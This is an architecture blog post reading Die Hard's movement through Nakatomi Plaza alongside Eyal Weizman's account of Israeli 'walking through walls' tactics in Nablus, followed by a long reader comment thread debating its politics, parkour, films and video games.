    "originBody": "Skip to content BLDGBLOG Architectural ConjectureUrban SpeculationLandscape Futures Nakatomi Space [Image: From Die Hard, directed by John McTiernan based on the novel Nothing Lasts Forever by Roderick Thorpe]. While watching Die Hard the other night—easily one of the best architectural films of the past 25 years—I kept thinking about an essay called “Lethal Theory” by Eyal Weizman—itself one of the best and most consequential architectural texts of the past decade (download the complete PDF). In it, Weizman—an Israeli architect and prominent critic of that nation’s territorial policy—documents many of the emerging spatial techniques used by the Israeli Defense Forces in their high-tech, legally dubious 2002 invasion of Nablus. During that battle, Weizman writes, “soldiers moved within the city across hundred-meter-long ‘overground-tunnels’ carved through a dense and contiguous urban fabric.” Their movements were thus almost entirely camouflaged, with troop movements hidden from above by virtue of always remaining inside buildings. “Although several thousand soldiers and several hundred Palestinian guerrilla fighters were maneuvering simultaneously in the city,” Weizman adds, “they were so ‘saturated’ within its fabric that very few would have been visible from an aerial perspective at any given moment.” Worthy of particular emphasis is Weizman’s reference to a technique called “walking through walls”: Furthermore, soldiers used none of the streets, roads, alleys, or courtyards that constitute the syntax of the city, and none of the external doors, internal stairwells, and windows that constitute the order of buildings, but rather moved horizontally through party walls, and vertically through holes blasted in ceilings and floors. Weizman goes on to interview a commander of the Israeli Paratrooper Brigade. The commander describes his forces as acting “like a worm that eats its way forward, emerging at points and then disappearing. We were thus moving from the interior of homes to their exterior in a surprising manner and in places we were not expected, arriving from behind and hitting the enemy that awaited us behind a corner.” This is how the troops could “adjust the relevant urban space to our needs,” he explains, and not the other way around. Indeed, the commander thus exhorted his troops as follows: “There is no other way of moving! If until now you were used to moving along roads and sidewalks, forget it! From now on we all walk through walls!” [Image: Israeli troops scan walls in a refugee camp; photo by Nir Kafri (2003), from Eyal Weizman’s essay “Lethal Theory”]. Weizman illustrates the other side of this terrifyingly dislocating experience by quoting an article originally published during the 2002 invasion. Here, a Palestinian woman, whose home was raided, recounts her witnessing of this technique: Imagine it—you’re sitting in your living room, which you know so well; this is the room where the family watches television together after the evening meal. . . . And, suddenly, that wall disappears with a deafening roar, the room fills with dust and debris, and through the wall pours one soldier after the other, screaming orders. You have no idea if they’re after you, if they’ve come to take over your home, or if your house just lies on their route to somewhere else. The children are screaming, panicking. . . . Is it possible to even begin to imagine the horror experienced by a five-year-old child as four, six, eight, twelve soldiers, their faces painted black, submachine guns pointed everywhere, antennas protruding from their backpacks, making them look like giant alien bugs, blast their way through that wall? In fact, I’m reminded of a scene toward the end of the recent WWII film Days of Glory in which we see a German soldier blasting his way horizontally through a house, wall by wall, using his bazooka as a blunt instrument of architectural reorganization—“adjusting the relevant space to his needs,” we might say—and chasing down the French troops without limiting himself to doors or stairways. In any case, post-battle surveys later revealed that “more than half of the buildings in the old city center of Nablus had routes forced through them, resulting in anywhere from one to eight openings in their walls, floors, or ceilings, which created several haphazard crossroutes”—a heavily armed improvisational navigation of the city. So why do I mention all this in the context of Die Hard? The majority of that film’s interest, I’d suggest, comes precisely through its depiction of architectural space: John McClane, a New York cop on his Christmas vacation, moves through a Los Angeles high-rise in basically every conceivable way but passing through its doors and hallways. [Images: From Die Hard]. McClane explores the tower—called Nakatomi Plaza—via elevator shafts and air ducts, crashing through windows from the outside-in and shooting open the locks of rooftop doorways. If there is not a corridor, he makes one; if there is not an opening, there will be soon. [Images: From Die Hard]. Over the course of the film, McClane blows up whole sections of the building; he stops elevators between floors; and he otherwise explores the internal spaces of Nakatomi Plaza in acts of virtuoso navigation that were neither imagined nor physically planned for by the architects. His is an infrastructure of nearly uninhibited movement within the material structure of the building. The film could perhaps have been subtitled “lessons in the inappropriate use of architecture,” were that not deliberately pretentious. But even the SWAT team members who unsuccessfully raid the structure come at it along indirect routes, marching through the landscaped rose garden on the building’s perimeter, and the terrorists who seize control of Nakatomi Plaza in the first place do so after arriving through the service entrance of an underground car park. [Images: From Die Hard]. What I find so interesting about Die Hard—in addition to unironically enjoying the film—is that it cinematically depicts what it means to bend space to your own particular navigational needs. This mutational exploration of architecture even supplies the building’s narrative premise: the terrorists are there for no other reason than to drill through and rob the Nakatomi Corporation’s electromagnetically sealed vault. Die Hard asks naive but powerful questions: If you have to get from A to B—that is, from the 31st floor to the lobby, or from the 26th floor to the roof—why not blast, carve, shoot, lockpick, and climb your way there, hitchhiking rides atop elevator cars and meandering through the labyrinthine, previously unexposed back-corridors of the built environment? Why not personally infest the spaces around you? [Images: From Die Hard]. I might even suggest that what would have made Die Hard 2 an interesting sequel—sadly, the series is unremarkable for the fact that each film is substantially worse than the one before—would have been if Die Hard’s spatial premise had been repeated on a much larger urban scale. For example, Weizman outlines what the Israeli Defense Forces call “hot pursuit”—that is, to “break into Palestinian controlled areas, enter neighborhoods and homes in search of suspects, and take suspects into custody for purposes of interrogation and detention.” This becomes a spatially extraordinary proposition when you consider that someone could be kidnapped from the 4th floor of a building by troops who have blasted through the walls and ceilings, coming down into that space from the 5th floor of a neighboring complex—and that the abductors might only have made it that far in the first place after moving through the walls of other structures nearby, blasting upward through underground infrastructure, leaping terrace-to-terrace between buildings, and more. An alternative-history plot for a much better Die Hard 2 could thus perhaps include a scene in which the rescuing squad of John McClane-led police officers does not even know what building they are in, a suitably bewildering encapsulation of this method of moving undetected through the city. “Walking through walls” thus becomes a kind of militarized parkour. [Image: Inside Nakatomi space, from Die Hard]. Indeed, recent films like The Bourne Ultimatum, Casino Royale, District 13, and many others could be viewed precisely as the urban-scale realization of Die Hard’s architectural scenario. Even The Bank Job—indeed, any bank heist film at all involving tunnels—makes this Weizmanian approach to city space quite explicit. [Image: From Die Hard; it’s hard to see here, but an LAPD SWAT team is raiding the Nakatomi Building by way of lateral movements across the surrounding landscape]. Tangentially, I’m reminded of Matt Jones’s thought-provoking 2008 blog post about the urban differences between the Jason Bourne and James Bond film franchises. Jones writes that “there’s no travel in the new Bond”; there are simply “establishing shots of exotic destinations.” By the end of a Bond film, he adds, you simply “feel like you are in the international late-capitalist nonplace,” a geography with neither landmarks nor personal memory. Compare the paradoxically unmoving, amnesiac geography of James Bond, then, to the compressed spaces of Paul Greengrass-directed Jason Bourne films. These films are “set in Schengen,” Jones writes, “a connected, border-less Mitteleurope that can be hacked and accessed and traversed—not without effort, but with determination, stolen vehicles and the right train timetables.” Indeed, Jones memorably suggests, “Bourne wraps cities, autobahns, ferries and train terminuses around him as the ultimate body-armor.” Rather than Bond’s private infrastructure [of] expensive cars and toys, Bourne uses public infrastructure as a superpower. A battered watch and an accurate U-Bahn time-table are all he needs for a perfectly-timed, death-defying evasion of the authorities. The space of the city is used in profoundly different ways by Bond and Bourne—but to this duality I would add John McClane of the original Die Hard. If Jason Bourne’s actions make visible the infrastructure-rich, borderless world of the EU, then John McClane shows us a new type of architectural space altogether—one that we might call, channeling topology, Nakatomi space, wherein buildings reveal near-infinite interiors, capable of being traversed through all manner of non-architectural means. In all three cases—with Bond, Bourne, and McClane—it is Hollywood action films that reveal to us something very important about how cities can be known, used, and navigated: these films are filled with the improvisational crossroutes that constitute Eyal Weizman’s “Lethal Theory.” As I wrote the other day, crime is a way to use the city. [Image: From Die Hard]. On the other hand, as Weizman points out, this is not a new approach to built space at all: In fact, although celebrated now as radically new, many of the procedures and processes described above have been part and parcel of urban operations throughout history. The defenders of the Paris Commune, much like those of the Kasbah of Algiers, Hue, Beirut, Jenin, and Nablus, navigated the city in small, loosely coordinated groups moving through openings and connections between homes, basements, and courtyards using alternative routes, secret passageways, and trapdoors. This is all just part of “a ghostlike military fantasy world of boundless fluidity, in which the space of the city becomes as navigable as an ocean.” [Image: From Die Hard]. Treated as an architectural premise, Die Hard becomes an exhilarating catalog of unorthodox movements through space. I would suggest again, then, that where the various Die Hard sequels went wrong was in abandoning this spatial investigation—one that could very easily have been scaled-up to encompass a city—and following, instead, the life of one character: John McClane. But, when taken out of Nakatomi Plaza—that is, out of the boundless, oceanic fluidity of Nakatomi space—McClane is reduced to an action film cliché whose failing charisma no amount of wise-cracking can salvage. (I remembered while writing this post that I actually discussed Die Hard on National Public Radio last year; you can listen to that show here).

Your mention of parkour is particularly crucial for me as I recently wrote an article in EPD about parkour and the urban space using Deleuze and Guattari's smooth and striated space theorum. If you feel so inclined to read it, it can be found on the EPD website. Reply enrique says: January 11, 2010 at 9:48 pm The \"Nakatomi Building\" is actually the Fox Plaza in Century City … the building was designed by William Pereira, who besides designing the Transamerica Pyramid, was also a set designer/art director (he also has an art direction credit for \"Die Hard\" … perhaps a nod to his involvement in the design of the building). I guess that one way to understand the architectural complexities of \"Nakatomi Space\" is to go beyond traditional notions of architectural representation. We would like to think that our architectural understanding of this building is sectional—we follow Bruce Willis as he literally cuts through the building much like a sectional drawing. But do we experience the building differently? Of course, but it is also worth noting that nothing in the film really considers the building in section. Everything is in plan. We note locations of people in relation to others along the horizontal plane (hence all these shots of Willis hiding behind things). But then again, the movie is about plans …. there is a plan to take over the building, a plan to steal bearer bonds, and of course, a plan to escape. Reply Nick says: January 11, 2010 at 10:05 pm This is great. I wrote a similar piece for a class using Weizman's article about the relationship between human and alien architecture in the video game Half-Life 2; the impenetrability of the alien walls leads to some interesting in-game navigation: http://www.visualwalkthroughs.com/halflife2/anticitizenone2/22.jpg (Especially considering that the game itself is basically a narrow path across and through buildings that only makes it appear that you can choose your direction.) I should probably polish that thing up and post it… Reply sportsbabel says: January 11, 2010 at 11:00 pm olimould beat me to it in pointing out that you cannot fully understand the Weizman article without engaging Deleuze and Guattari's smooth and striated space. But I am wondering: don't we need to distinguish between John McClane using existing elevator shafts or air ducts — existing striations — and the Israeli soldiers who blast new holes through walls — smoothing space? While subjects remain invisible in both situations, is Nakatomi space really the same as Nablus space? Slightly related: the videogame Portal, which is based on a simple premise but conceptually fascinating. Reply TrentonGB says: January 11, 2010 at 11:56 pm For those looking to experience this sort of movement without purchasing plastic explosive or learning parkour, I highly recommend renting Red Faction 3. The best players in multiplayer use these tactics continuously. The rhino pack, sledgehammer, boost pack, and explosives enable full 3d movement through a destructible urban fabric. Reply turlie says: January 12, 2010 at 3:11 am after seeing the movie when i was 14 i went home and started to do new design for the building, floor plans and all…..not sure where they ended up Reply Alex Fleck says: January 12, 2010 at 3:33 am I love your reading of Die Hard. From a literary perspective it's telling that McClane's somewhat ratlike, interior adventures contribute to the steadily rising action of the film, while the climactic leap from the top represents an explosion out of the contained space of the building. In the same way that he's a master of intricate internal movement in enclosed space, he becomes a master of fluid movement at the movie's end, freeing himself even from the necessity for passageways, etc. Reply Osaka Nagaremono says: January 12, 2010 at 5:09 am The techniques used by the IDF were originally developed by the Canadian Army during particularly vicious fighting in Ortona. They called mouseholing, where they would go up to the attic, blow a hole through the wall, clear the next house and move on. It almost entirely removes the threat of snipers, camouflages one's movements and provides some cover from artillery Reply Dylan Corbett says: January 12, 2010 at 6:11 am It brings to mind a new kind of structural design where a building is built specifically to have no forbidden space. Air ducts are converted into larger spaces to accommodate humans and turned into hallways and instead of elevator shafts there are escalators. Walls are made of paper thin material and able to shift at wall, constantly creating new rooms. If you want a bigger office with a better view, just shift some walls. For places like utility closets and where the main electronics would go, instead of being shoved into a basement, they could be integrated into the building as a new form of sculpture. Wires would run along in intricate colorful patterns on the walls and ceilings making a beautiful rainbow to look at while you explore. Hopefully the freedom of the space would make you feel as though you were still outside, rather than confined to a building. Like weather, or traffic, your surroundings would also be constantly changing. Employees might even begin discussing who gets how much space and for how long. Just something that your ideas made me think about… Reply Neal says: January 12, 2010 at 8:04 am Great post. Makes me think you might be interested in Jack Hawksmoor \"King of Cities\" from the comic book The Authority (among others). He was created by Warren Ellis out of an insight about how deeply Superheores are connected to cities. He's like Spiderman, but instead of being defined by a radioactive bug bite, he is defined by the urban environment he moves through. His power is derived from symbiosis with the city. He climbs buildings, he doesn't wear shoes, he takes in smog as nourishment, and if he spends to long outside a city, he dies. http://en.wikipedia.org/wiki/Jack_Hawksmoor Reply Dan Kelly says: January 12, 2010 at 10:27 am That reminds me Shortly after moving to London we had a leak in our flat. Whilst working a plumber recounted a \"burglary\" on a site he'd been working on. The site was new build flats, with some of the flats being occupied. On day someone had gained access to the empty end flat on one of the occupied floors and using a sharp knife cut through the plasterboard partition wall to the next flat. And the next, and so on. Any occupied flat was divested of its valuables. Reply Anonymous says: January 12, 2010 at 2:31 pm I thought a movie I saw recently had a very strong architectural presence: 'Beaufort', a 2007 Israeli film about a group of IDF soldiers in a hilltop concrete and steel fort (next to the remains of a Crusader castle) in southern Lebanon. I also noticed in it the unusual personal architecture of the Israeli soldier, with their oddly-shaped helmet sacks (?) to camouflage the outlines of their heads. Reply Jim Meredith says: January 12, 2010 at 3:57 pm \"Boundless, oceanic fluidity of Nakatomi space\" has such poetic charm associated with it that it almost sounds like the foundation for a manifesto for a new kind of architecture and urbanism. However, as you note early in you piece by quoting those who maintain, live in, and trust the concept of private space, the Nakatomi/Nablus/DieHard concept is, in fact, a shocking and gross violation of a core concept of civil society. Whether as the Israeli army \"worm\" or the worm in our computers, busting through walls is an act of violation and violence. To celebrate it is symptomatic of the erosion of civility most recently exemplified by the Zuckerburg/Facebook emerging manifesto – \"privacy is no longer a social norm.\" Reply Geoff Manaugh says: January 12, 2010 at 5:34 pm Alex Fleck, your notion that McClane is \"freeing himself even from the necessity for passageways\" by leaping off the roof toward the end of the film is amazing. The film was his process of becoming-nonarchitectural, I might add, in deliberate theorizing mode, and Nagatomi Plaza was where he began work on this personal theory of boundlessness. Jim Meredith, I think you're confusing an action with its actor. If Weizman's piece had been about the exact same spatial techniques, but he had, instead, been interviewing members of a Chinese resistance group who had been tunneling and \"worming\" their way into imperial prisons—in the exact same manner—in order to rescue political detainees, I literally cannot imagine you then saying that \"bursting through walls is an act of violation and violence\" that should never be tolerated, and they should go put the prisoners back in their rightful place. In fact, I'm reminded of Dwayne T. Robinson, a character in Die Hard, who chastises John McClane for breaking so much glass; in the context of the film, this doesn't add very much to Robinson's likability. I would also say that this piece does not \"celebrate\" the Israeli invasion of Nablus; it says quite clearly, in fact, that the invasion was \"legally dubious\" even as it urges everyone to read Eyal Weizman's paper—and it's difficult to interpret \"Lethal Theory\" as an endorsement of Israeli invasions. On the other hand, this post does draw spatial parallels between \"walking through walls,\" as Weizman describes it, and John McClane's various trajectories through the Nakatomi building—but it doesn't say: Die Hard is a great movie, ergo we should celebrate the Israeli Defense Forces. I think pretending to be outraged when architectural space has been violated—broken windows, burst doors, collapsed walls—is only relevant if you are out to score quick political points by laying down the card of moral outrage. I appreciate the fact that you were offended by this piece (you found it \"shocking and gross\"), but consider if Weizman had been documenting the exact same spatial techniques, only used by Gazan smugglers to enter Israeli territory from below—\"walking through the earth,\" we might say—or by cutting holes through the Israeli border fence; or the exact same spatial techniques, again, but used by Iranian protest groups to free their comrades from secret basement prison wards; or even a small group of political protestors hoping to show how easy it is to get into a gated community in Anaheim. I don't think the insured value of architectural space would be the first thing on your mind—\"busting through walls is an act of violation and violence\"—if a group of people freed themselves from a prison camp in the mountains of Xinjiang. Perhaps I'm wrong. In any case, it's possible to explore, with enthusiasm, this radical, wormhole-like use of architectural space—cutting through walls, moving up through floors, and bursting lateral routes through the city—without endorsing every single political situation in which such techniques are put to use. Meanwhile, sportsbabel, there is definitely a difference between the Nablusian cutting of whole new routes through the city and the Nakatomian employment of preexisting subspaces—and I should have done more to highlight those differences—but they do often overlap. That's worth drawing out, though, in a longer take on this. Dan Kelly, that's an insane robbery story! Enrique, I would love to think more about Die Hard and sectional representation. Would McClane be an agent of the nonsectional? Or an agent of the counter-sectional? Or is perhaps he an agent of the section deployed against the plan? Reply Jim Meredith says: January 12, 2010 at 6:42 pm Geoff – Thanks for your comments and response. Maybe just to clarify – * In most of my own work I both argue for and design for openness and boundarylessness. In the contexts in which I work, these approaches support a sense of community and the development of a culture which is typically considerate, sharing, creative and productive. * The concern I expressed was provoked by the concept of civilian and private property being drawn into conflict as an instrument of war by its combatants. Ancient considerations of \"sanctuary\" and even more modern concepts about civilian casualties seem to be thrust aside in many conflict zones. (I do take some pleasure in the open conversation now taking place about American/UN practices and civilian concerns in Afghanistan.) * A lesser concern, yet drawn into consideration by the connotations of \"worm\" and [fire]walls, is the gathering momentum of claims by corporations of ownership and commercialization of private information. I appreciate the examples in your reply, Geoff, because they also clarify the different contexts, and especially the differential considerations, of burrowing through institutional and public \"walls\" versus private walls. I also like the passion in your reply. Please let me call your attention, however, to the fact that I found the \"concept\" of military violation of private civilian space to be what I called \"shocking and gross\" and NOT your piece. I do, in fact, appreciate all of your work, Geoff, and especially the role it has played in provoking interest, conversation, education, expansion of thinking, critical practice, etc., through the subject of architecture. Your consideration here of walls, whether as physical fact or as metaphor, are a good example of that good work! Reply Geoff Manaugh says: January 12, 2010 at 7:00 pm Jim, thanks for the follow-up and clarification—in particular re: the \"shocking and gross\" comment! I apologize for misreading your previous note. I do, indeed, see—along with you and Weizman—extraordinarily bad possibilities for sovereign violations of private space, should \"wormholing\" (or \"walking through the earth,\" as I mentioned earlier) become an everyday part of urban police tactics. Although it might actually be worth mentioning here the massive metal wall that Egypt is building inside the earth to prevent tunneling operations into and out of Gaza—it's a kind of imperial counter-wormhole. In fact, here I think Reza Negarestani's work in Cyclonopedia is particularly interesting: who controls, creates, and dispenses these tunnel networks? Negarestani calls it something like the \"hole complex\" (my copy of the book is in a storage unit in LA). Not to put a Freudian spin on this, but the most important question here might be: who controls the holes? Also, Dan Kelly, I just remembered something: I can't say that I would recommend this book, but should you ever come across a copy of The Tesseract by Alex Garland, the main character escapes from armed gangsters in almost exactly the way you've described your robbers entering that building: he bursts through wall after wall in a decrepit hotel until he finally breaks through on the street. It is, we might say, Nakatomian.

Reply doctorcasino says: January 13, 2010 at 4:09 pm Interesting piece, and obviously made for my eyes, as I'm an archi-dork on record as considering Die Hard his favorite movie ever. But… I have some issues with the essay. You rather exaggerate the events of the film to make it work and in the process shift it from one thing to another – – this is a film about moving through interstitial and unofficial space, okay, but it's not about burrowing your way through walls and floors – when does Bruce Willis do any of that? (Although I do like the point Alex Fleck makes about Willis abandoning architecture at the end – especially given the line [paraphrase]: \"God, if you get me outta this, I promise I will never go in a tall building again!\") Well, OK, fine – I think we all have a tacit license to stretch the contents of films/songs/whatever to make them work for archi-essays. But the irksome thing is how drained of politics this reading is. What makes the Weizman piece so provocative it that it points out that the ideas that were so groovy and exciting to contemporary architectural theorists were equally groovy and exciting to state terrorists dynamiting their way through people's living rooms. What seemed like a theory of liberating possibility turned out to be, or at least parallel, a great manual for oppression. So when you call Die Hard an \"exhilirating catalog of unorthodox movements through space\" and ask \"Why not personally infest the spaces around you?\" I feel compelled to answer …because I don't want to be the Israeli army, dude! To look at Weizman and then turn to Die Hard seems like a great opening for, at least, a critical re-reading of the film – it seems exciting but it turns out to be propaganda! – but it's as if, after considering the Weizman, you just return to Die Hard with the same enthusiasm that the Nablus coverage is calling into question. Maybe I'm misreading you, though. Reply dave says: January 13, 2010 at 5:31 pm Worth considering also is the ongoing interactive entertainment relationship between architectural space and gaming.

Red Faction: Guerilla. With it's fully destructible buildings you can perform many of the feats listed in the post. Rescuing a hostage on the 3rd floor of a building for example can be done in any number of ways. Use a jetpack to get to the roof and smash down to the relevant floor. Shoot holes in the ceiling and make your way up. Or, find a ramp a vehicle and go direct to the third floor. I can also see elements of Call of Duty MW as the above comment mentions, especially when thinking about the Israeli tactics mentioned above. Reply Will Hindmarch says: January 13, 2010 at 9:06 pm Great article and a fascinating new reading of the film. I'd argue, though, that the second two Die Hard pictures are still meant to be explorations of place and defiance of traditional movement, to some extent. The second film uses the redefinition of sea level as a weapon to destroy a passenger plane, for example. It otherwise doesn't try very hard, I agree. The third film, Die Hard With A Vengeance, though, is full of illicit urban movement and things masquerading as other things, especially as traditional urban tropes like police officers that turn out to be thieves and playgrounds that turn out to be bombs. Again, I don't think it's as successful, but the third film (also a McTiernan picture), is, I think, pursuing a similar agenda at least. I think it's restrained by its script (which was not originally written to be a Die Hard movie at all, as I understand it) and by the difficulties in pulling off the same ideas on an urban scale, but I admire its attempts to pursue the idea. I mention this if only to get you to rewatch the third film in this same context and write about what you find. Reply doctorcasino says: January 13, 2010 at 9:23 pm Hmm, that is interesting… I think the main thing the third film takes from the first (in terms of \"Die-Hard-ness\") is the villains seeming to be in one kind of movie and actually being in another (terrorists = thieves, vs. \"i'm obsessed with messing with this cop's mind\" = thieves). I think as a study in reterritorialization it's less valuable than the first film, but we do get them driving all over Central Park which I guess is interesting… Reply Will Hindmarch says: January 13, 2010 at 9:42 pm Also, by the way, the latter Bourne movies are directed by Paul Greengrass, not Peter. Reply Will says: January 13, 2010 at 9:47 pm @doctorcasino: The third film also features tunneling into vaults, tunnels under the city, wrong-way traffic, trains off their tracks (in still more tunnels), boarding boats from bridges, and helicopters colliding with power lines — you're right that it's not reterritorialization, but it does play with the ways that spaces are connected to one another. When McClane does travel, he doesn't do it going with traffic on the traditional arteries, for the most part. When he does, it turns out badly (as in the elevator and the train). I'm just spitballing, here, though.

Reply Graham J says: January 15, 2010 at 1:58 pm Interesting read for sure. Die Hard is certainly one good example of this but The Matrix also comes to mind. The urban running and inner wall climbing are obvious examples but in a more metaphysical sense the characters' entry and egress from the real world also serve as a non-architectural means of traversing the Matrix. Thanks for once again making me think of something I hadn't before considered! Reply E.H. says: January 15, 2010 at 5:58 pm One relevent point that Weizman makes is that this intellectualization (Guattari, Deleuze, striated space, Bernard Tschumi blah blah blah) itself serves as a masking discourse which covers up the violence and criminality of the Israeli army's actions. By describing their intentions in terms of post-modern architecture, the Israeli army projects itself as academic, intellectual, sophisticated, when in fact all they are doing is blowing up innocent people's living rooms. And, as others here have pointed out, its not like they are doing anything that different from how many armies historically have acted. Reply The Secretary says: January 15, 2010 at 8:34 pm Seconding E.H.'s comment. Also, it's interesting how the IDF gets to sit around and talk about smooth and striated spaces, and their ability to simply ignore \"traditional\" boundaries in Palestinian space. Isn't this simply the mentality of power over powerlessness: one group has the ability to maintain the sanctity of its borders, and the other group has no ability to protect any type of borders. The message of the IDF is: you have no borders or walls to protect you. The message of the IDF is: our borders are inviolate and sacred. Thus, rocket attacks that kill a handful of individuals on the Israeli side of the border are met with reprisals that kill hundreds on the Palestinian side of the border. To intellectualize the terms of the engagement, which are not super interesting or complicated — it really is simply about who has the guns and the bombs and the funding and therefore the ability to \"walk through walls\" or, should we say, less euphemistically, to \"bulldoze through people\" — is a little off-putting: it comes off as the comfortable speculations and aestheticization of violence we sitting in our well defended and comfortably appointed walls can afford to indulge in. The idea of \"walking through walls\" may be cool, but I do agree with doctorcasino: trying to extract the tactic from the place and context in which it's used, while describing it so enthusiastically, feels a bit icky. (And I expect that \"icky\" will be thrown back at me in scare quotes.)

Reply attheheliopause says: January 16, 2010 at 3:52 pm Re feeling icky: applying violence against buildings, like against people, isn't something that comes 'naturally' even to soldiers. Learning to think and act in these terms takes up a fair amount of modern MOUT training. In the battle of Mogadishu (the Black Hawk Down events), I seem to remember reading that the Delta operators began kicking in doors and moving through houses, while the Rangers instinctively stayed on the streets even though it left themselves more exposed. It's also interesting to look at the response to these sort of tactics. During the Battle of Jenin (which took place roughly simultaneously with Nablus in 2002), Palestinian fighters booby-trapped houses which they expected the Israelis to move through, then blew them up on their heads. In 2006, the IDF used the same sorts of tactics in Lebanese villages. The Hizballah fighters would lure them in, pull out to the nearby woods and fire anti-tank rockets to bring down the houses the Israelis were taking cover in. Effectively, you can turn a building itself into a weapon if you're willing to destroy it. Palestinian and Hizballah fighters usually operate close to home, so it was their neighbors', even their own, houses that they were destroying. I wonder whether this is the architectural equivalent to suicide bombing – being willing to destroy your own home once it's invaded in order to kill the invaders.

Great thought provoking post. Reply PointClickFire says: January 18, 2010 at 12:26 am As I was reading this I was waiting for you to mention Parkour. As a practitioner of parkour as well as somebody who likes architecture, I see a similar connection between the movement and the building itself. While for public image reasons parkour tries to be non-destructive, we still use the architecture as a tool in ways it was not intended, climbing up drainpipes vaulting over railings jumping gaps and dropping from story to story. It is undermining the importance placed on the infrastructure the architect intended to be used to traverse the building and instead using everything that is there to it's fullest potential. In my mind it's almost a form of appreciating the architecture by recognizing every small detail of the building that would be ignored by most, while also appreciating the power of the human body alone to utilize the architecture. If you were to write an article about Parkour from the architectural side I think that could be really interesting.

Reply Anonymous says: January 19, 2010 at 3:36 am You might want to ask yourself why your instinctive reaction to the IDF fighting against Palestinian guerillas and Hezbollah is negative in every respect; consider that the Palestinians have rejected every truce offer and peace treaty for sixty years, preferring to concentrate their violence against innocent parties. You have all gone to a very dark place and should be ashamed of yourselves. I doubt you will be though.

Reply I Am The Manta says: January 21, 2010 at 9:35 pm A friend has just directed me to this post, and very impressive it is too. To pick up the videogame thread from where it left off, there are two games which you should play if you haven't yet. The first is Assassins Creed II, which splices genuine reconstructions of Renaissance architecture with a fictional assassination plot. What makes the game so interesting in the context of this piece, is that each building becomes an abstract fortress to be penetrated via improvised routes – anything but the heavily guarded front door. Not only does this provide a brilliant opportunity to examine architectural constructs from a variety of different perspectives, it also shifts their designer's intentions to something far less prescribed. The second, is Mirror's Edge, in which you play a 'runner' who must keep the resistence's communication channels open in the face of an oppressive future government. The game feels heavily influenced by Half-Life 2, but the requirement to stay on the rooftops, using any route you can to travel vast distances quickly and undetected makes it of particular interest. Any time spent inside immediately becomes a puzzle in which you must navigate corporately sterile environments in ways the imagined architects certainly didn't foresee (although, the fact that the game designers have creates an interesting doublebluff scenario) in order to escape the heavy-handed police. With its lift shafts, ventilation ducts, dizzying heights and use of environment as advantage, Mirror's Edge is perhaps the closest videogame parallel to both Die Hard, and Bourne. I urge you to play it. Reply Slack-a-gogo says: January 23, 2010 at 7:12 pm Fantastic piece. I love your take on Die Hard, a favorite movie I've watched many times, and will now watch with a slightly different perspective. And I love your idea for a Die Hard sequel of them not even which building they're in. And finally, the phrase \"militarized parkour\" struck me almost being poetic. Reply Diplocephalus says: January 25, 2010 at 12:21 am This is a really stimulating article. Some people have mentioned video games; another person mentioned parkour. The Metroid series seems like an apt combination of the two, which is well-known for its speed-running community (people manipulating the avatar for \"unintended\" routes through environments). I'd recommend a viewing of the record-run for Super Metroid on the Speed Demos Archive, for anyone who's interested; it helps to first know how the game basically works, though. Reply jjohnjj says: January 31, 2010 at 12:08 am That's a grim tale from Gaza. I think we all got a taste of that kind of conflict watching \"Children of Men\". Good essay on \"Die Hard\", tho… It should be noted that the \"skyscraper\" fell out of fashion for a couple of decades, as corporations fled to suburban \"campus\" style headquarters. But with the demise of the International Style, downtown towers staged a comeback in the 1980's with terrific new designs that each put a unique signature on the skyline. The corporate egos couldn't resist. Hollywood has sought out fashionable settings for its stories since \"North by Northwest\" concluded the chase at Mount Rushmore. But the \"Nakatomi\" tower was much more than a backdrop to the story of \"Die Hard\". The Eighties were also the time when Japan invested the megacash from it's own economic bubble to buy some prominent commercial property in the U.S. This caused a lot of jingoistic anxiety, exploited more fully by Michael Chrichton in \"Rising Sun\". \"Die Hard\" portrayed the Japanese executive with considerable sympathy, but remember, the imposing and superior Nakatomi tower represented a foreign power that was STEALING JOHN McCLANE'S WOMAN! (There's a whole other zeitgeist here about American men losing their good-paying factory jobs while their wives started going to work in the information economy). The Japanese had already conquered our smokestack industries. Now they were buying Columbia Pictures and opening BANKS in the U.S.! What next? McClane had two foes in the story. the German \"terrorists\" and Japan Inc. – represented by the tower. It's almost prescient that McClane, the archetype American \"soldier\", found himself struggling barefoot against terrorists within a gigantic, incomprehensible world created by foreign powers. But it was quite satisfying when the top of the building exploded in flames. Was this climax the decapitation of America's economic rival? The restoration of McClane's marriage? Or both? BTW… my wife just happened to be looking east from her West LA apartment the moment that they lit off those pyrotechnics. Being a longtime LA resident, she didn't call 911. \"Someone must be filming\", she thought. Reply keith eggener says: February 16, 2010 at 5:17 pm This is really good.

'Die Hard' has always been at the top of my list of films employing architecture as a crucial storytelling element. (Indeed, in this movie Nakatomi Plaza is practically a cast member.) One shouldn't overlook the fact that Joel Silver, a well-known architecture buff, is one of film's producers. A look at his film credits, which include The Matrix (http://en.wikipedia.org/wiki/Joel_Silver#Producer_credits), reveals a producer with a record of movies that make terrific use of set design. Reply Russell says: February 19, 2010 at 1:29 pm I enjoyed the post, but it's main premise is a false one and quite misleading. You're comparing what I would call \"filmic\" space to real space, in terms of Hollywood versus the Israeli army. Hollywood films have a long tradition of falsely representing architecture–and more specifically, its engineering–in ways that prop up otherwise gaping holes in plot lines. The \"Die Hard\" movie is, on those terms, purely fantasy, as even Bruce Willis cannot blast his way through mechanical ventilation ducts that are closed off with dampers every so many feet or otherwise full of screws poking up through sheet metal. And aside from main supply ducts vertically through a building and at the air-handling units, most ducts are too small for you and me. Fox Plaza is a pretty conventional office building, with a basic HVAC system–there's no way someone's crawling through it. Directors and screenwriters love to have the hero sneak through duct work, sliding along and secretly maneuvering through buildings because it suggests ingenuity and a talent for instant creative thinking on the hero's part, as well as giving them an element of surprise with the villain. It sure beats having to do the leg work of thoughtful character development! So, to be \"real\" about it, if you would want to effortlessly move through–or \"infest\"–a building vertically, without relying on elevators or stairs (or elevator shafts), you would need to blow a hole in the slab. To move horizontally through a ceiling void, well, perhaps you could on a cable tray, but it would be slow going, noisy, and when you reach a fire-rated wall, you'd have to jump down, walk through a door (or blast through a wall?) and climb back up into the ceiling. At this point, I'd have to ask, why bother? In the end, as other commentary has suggested, you would be engaging in a non-productive form of violence to the building and that, in my mind, should remain the provenance of the gaming world.

